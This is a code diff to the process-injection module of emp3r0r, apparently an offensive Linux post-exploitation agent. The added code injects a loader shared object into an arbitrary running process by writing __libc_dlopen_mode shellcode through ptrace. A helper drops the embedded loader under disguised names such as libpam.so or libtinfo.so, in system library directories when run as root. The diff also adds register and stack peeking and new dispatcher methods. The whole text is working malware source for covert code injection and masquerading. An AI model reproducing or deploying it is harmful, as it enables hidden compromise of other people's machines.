@@ -21,7 +21,7 @@ import (
 )
 
 // inject a shared library using dlopen
-func gdbInjectSO(path_to_so string, pid int) error {
+func gdbInjectSOWorker(path_to_so string, pid int) error {
 	gdb_path := emp3r0r_data.UtilsPath + "/gdb"
 	if !util.IsFileExist(gdb_path) {
 		res := VaccineHandler()
@@ -193,6 +193,38 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		}
 		log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), stoppedRegs.Rip)
 
+		// what's after RIP when stopped
+		peek_stop := make([]byte, 32)
+		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rip), peek_stop)
+		if err != nil {
+			return fmt.Errorf("PEEK: 0x%x", stoppedRegs.Rip)
+		}
+		log.Printf("Peeked %d bytes from RIP: %x at RIP (0x%x)", n, peekWord, stoppedRegs.Rip)
+
+		peek_stack := make([]byte, 128)
+		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsp), peek_stack)
+		if err != nil {
+			log.Printf("PEEK stack: 0x%x", stoppedRegs.Rsp)
+		}
+		// also the regs
+		peek_rdi := make([]byte, 64)
+		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rdi), peek_rdi)
+		if err != nil {
+			log.Printf("PEEK RDI: 0x%x", stoppedRegs.Rdi)
+		}
+		peek_rsi := make([]byte, 64)
+		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsi), peek_rsi)
+		if err != nil {
+			log.Printf("PEEK RSI: 0x%x", stoppedRegs.Rsi)
+		}
+		log.Printf("At (0x%x), RAX = 0x%x RDI = 0x%x -> 0x%x (%s), RSI = 0x%x -> 0x%x (%s)\n"+
+			"Stack (0x%x) = 0x%x (%s)",
+			stoppedRegs.Rip,
+			stoppedRegs.Rax,
+			stoppedRegs.Rdi, peek_rdi, peek_rdi,
+			stoppedRegs.Rsi, peek_rsi, peek_rsi,
+			stoppedRegs.Rsp, peek_stack, peek_stack)
+
 		// restore registers
 		err = syscall.PtraceSetRegs(pid, origRegs)
 		if err != nil {
@@ -225,9 +257,39 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 	return nil
 }
 
+func injectSOWorker(so_path string, pid int) (err error) {
+	dlopen_addr := GetSymFromLibc(pid, "__libc_dlopen_mode")
+	if dlopen_addr == 0 {
+		return fmt.Errorf("failed to get __libc_dlopen_mode address")
+	}
+	shellcode := gen_dlopen_shellcode(so_path, dlopen_addr)
+	if len(shellcode) == 0 {
+		return fmt.Errorf("failed to generate dlopen shellcode")
+	}
+	return ShellcodeInjector(&shellcode, pid)
+}
+
+// InjectSO inject loader.so into any process, using shellcode
+// locate __libc_dlopen_mode in memory then use it to load SO
+func InjectSO(pid int) error {
+	so_path, err := prepare_injectSO(pid)
+	if err != nil {
+		return err
+	}
+	return injectSOWorker(so_path, pid)
+}
+
 // Inject loader.so into any process
 func GDBInjectSO(pid int) error {
-	so_path := fmt.Sprintf("%s/libtinfo.so.2.1.%d", emp3r0r_data.UtilsPath, util.RandInt(0, 30))
+	so_path, err := prepare_injectSO(pid)
+	if err != nil {
+		return err
+	}
+	return gdbInjectSOWorker(so_path, pid)
+}
+
+func prepare_injectSO(pid int) (so_path string, err error) {
+	so_path = fmt.Sprintf("%s/libtinfo.so.2.1.%d", emp3r0r_data.UtilsPath, util.RandInt(0, 30))
 	if os.Geteuid() == 0 {
 		root_so_path := fmt.Sprintf("/usr/lib/x86_64-linux-gnu/libpam.so.1.%d.1", util.RandInt(0, 20))
 		so_path = root_so_path
@@ -235,14 +297,14 @@ func GDBInjectSO(pid int) error {
 	if !util.IsFileExist(so_path) {
 		out, err := golpe.ExtractFileFromString(emp3r0r_data.LoaderSO_Data)
 		if err != nil {
-			return fmt.Errorf("Extract loader.so failed: %v", err)
+			return "", fmt.Errorf("Extract loader.so failed: %v", err)
 		}
 		err = ioutil.WriteFile(so_path, out, 0644)
 		if err != nil {
-			return fmt.Errorf("Write loader.so failed: %v", err)
+			return "", fmt.Errorf("Write loader.so failed: %v", err)
 		}
 	}
-	return gdbInjectSO(so_path, pid)
+	return
 }
 
 // InjectorHandler handles `injector` module
@@ -267,11 +329,13 @@ func InjectorHandler(pid int, method string) (err error) {
 
 	// dispatch
 	switch method {
-	case "gdb":
+	case "gdb_loader":
 		err = GDBInjectSO(pid)
-	case "native":
+	case "inject_shellcode":
 		shellcode, _ := prepare_sc()
 		err = ShellcodeInjector(&shellcode, pid)
+	case "inject_loader":
+		err = InjectSO(pid)
 	default:
 		err = fmt.Errorf("%s is not supported", method)
 	}
